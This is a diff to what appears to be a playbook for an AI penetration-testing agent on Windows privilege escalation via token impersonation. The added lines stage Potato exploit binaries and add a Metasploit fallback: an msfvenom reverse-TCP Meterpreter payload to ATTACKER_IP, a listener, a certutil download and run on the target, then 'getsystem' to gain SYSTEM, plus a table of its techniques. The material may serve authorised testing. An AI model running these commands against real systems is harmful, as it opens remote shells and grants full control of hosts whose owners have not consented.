@@ -67,6 +67,9 @@ and records state changes. Your return summary must include:
 - At least one exploitable token privilege (check with `whoami /priv`)
 - OR: known credentials for a user who can write to a service webroot (see Step 0)
 - Ability to transfer tools to target (or use tools already present)
+- Potato binaries pre-staged at `/usr/share/windows-binaries/potatoes/` on the
+  attackbox (GodPotato-NET4.exe, PrintSpoofer64.exe, JuicyPotatoNG.exe,
+  SigmaPotato.exe). If missing, fall back to Metasploit `getsystem` (Step 3b).
 
 ## Step 0: Obtain SeImpersonate Shell
 
@@ -449,11 +452,53 @@ whoami /priv → SeImpersonate or SeAssignPrimaryToken?
 ├─ Spooler disabled everywhere?
 │  └─ GodPotato > EfsPotato > RoguePotato > PrintNotifyPotato
 │
-└─ ALL POTATO VARIANTS FAILED? (wrong arch, no binary, service disabled, blocked)
+└─ No standalone Potato binaries available?
+│  └─ Try Metasploit getsystem (Step 3b) if Meterpreter is viable
+│
+└─ ALL METHODS FAILED? (wrong arch, no binary, service disabled, blocked)
    └─ STOP. Do NOT attempt kernel exploits inline.
      Update state.md with: what was tried, why it failed, OS version, arch.
      Return to orchestrator for re-routing to **windows-kernel-exploits**.
 ```
+
+### Step 3b: Metasploit getsystem (Fallback)
+
+When standalone Potato binaries are not pre-staged on the attackbox, use
+Metasploit's built-in `getsystem` which implements multiple named pipe
+impersonation techniques internally.
+
+```bash
+# 1. Generate Meterpreter payload
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+    LHOST=ATTACKER_IP LPORT=9001 -f exe -o /tmp/claude-1000/meterpreter.exe
+
+# 2. Start handler
+msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST ATTACKER_IP; set LPORT 9001; run"
+
+# 3. Transfer and execute payload on target (via existing shell)
+# Serve: python3 -m http.server 8888 --directory /tmp/claude-1000
+# Download on target: certutil -urlcache -f http://ATTACKER:8888/meterpreter.exe C:\Windows\Temp\svc.exe
+# Execute: C:\Windows\Temp\svc.exe
+
+# 4. In Meterpreter session:
+getsystem
+getuid        # Should show NT AUTHORITY\SYSTEM
+```
+
+**getsystem techniques (in order):**
+
+| # | Technique | Pipe | Notes |
+|---|-----------|------|-------|
+| 1 | Named Pipe Impersonation (In-Memory) | `\\.\pipe\random` | Default, most common |
+| 2 | Named Pipe Impersonation (Dropper) | `\\.\pipe\random` | Drops DLL |
+| 3 | Token Duplication (In-Memory) | — | Duplicates from SYSTEM process |
+| 4 | Named Pipe Impersonation (RPCSS) | RPCSS variant | — |
+| 5 | Named Pipe Impersonation (PrintSpoofer) | `\\.\pipe\spoolss` | Needs Spooler |
+| 6 | Named Pipe Impersonation (EfsPotato) | `\\.\pipe\efsrpc` | Most reliable fallback |
+
+Technique 6 (EfsPotato/EFSRPC) is the most reliable when Print Spooler is
+disabled. If `getsystem` fails with default technique, specify:
+`getsystem -t 6`
 
 ## Step 4: Other Dangerous Privilege Exploitation
 
